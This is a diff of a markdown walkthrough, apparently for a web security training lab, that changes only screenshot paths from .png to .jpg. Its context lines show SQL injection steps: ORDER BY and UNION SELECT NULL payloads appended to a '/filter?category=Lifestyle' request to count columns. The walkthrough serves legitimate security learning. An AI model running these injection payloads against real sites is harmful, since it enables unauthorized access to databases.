@@ -11,7 +11,7 @@ step 1
 send `/filter?category=Lifestyle` to repeater
 send request you will get 4 different item
 
-![screnshot](./images/lab3_lifstyle_repeater.png)
+![screnshot](images/lab3_lifstyle_repeater.jpg)
 
 
 
@@ -29,21 +29,21 @@ step 2
 add `'+ORDER+BY+1--` at the end
 `/filter?category=Lifestyle'+ORDER+BY+1--`
 
-![screnshot](./images/lab3_order_by_1.png)
+![screnshot](images/lab3_order_by_1.jpg)
 
 step 3
 
 `'+ORDER+BY+2--`
 `/filter?category=Lifestyle'+ORDER+BY+2--`
 
-![screnshot](./images/lab3_order_by_2.png)
+![screnshot](images/lab3_order_by_2.jpg)
 
 step 4
 
 `'+ORDER+BY+3-- `
 `/filter?category=Lifestyle'+ORDER+BY+3--`
 
-![screnshot](./images/lab3_order_by_3.png)
+![screnshot](images/lab3_order_by_3.jpg)
 
 step 5
 
@@ -51,7 +51,7 @@ step 5
 `/filter?category=Lifestyle'+ORDER+BY+4--`
 The ORDER BY position number 4 is out of range of the number of items in the select list. so you get internal error
 
-![screnshot](./images/lab3_order_by_4.png)
+![screnshot](images/lab3_order_by_4.jpg)
 
 
 
@@ -70,19 +70,19 @@ step 6
 add `'+UNION+SELECT+NULL--` at the end
 `/filter?category=Lifestyle'+UNION+SELECT+NULL--`
 
-![screnshot](./images/lab3_lifestyle_repeater_null.png)
+![screnshot](images/lab3_lifestyle_repeater_null.jpg)
 
 step 7
 
 `/filter?category=Lifestyle'+UNION+SELECT+NULL,NULL--`
 
-![screnshot](./images/lab3_lifestyle_repeater_null_null.png)
+![screnshot](images/lab3_lifestyle_repeater_null_null.jpg)
 
 step 8
 
 `/filter?category=Lifestyle'+UNION+SELECT+NULL,NULL,NULL--`
 
-![screnshot](./images/lab3_lifestyle_repeater_null_null_null.png)
+![screnshot](images/lab3_lifestyle_repeater_null_null_null.jpg)
 
 
-![screnshot](./images/lab3_solved_lab.png)
+![screnshot](images/lab3_solved_lab.jpg)
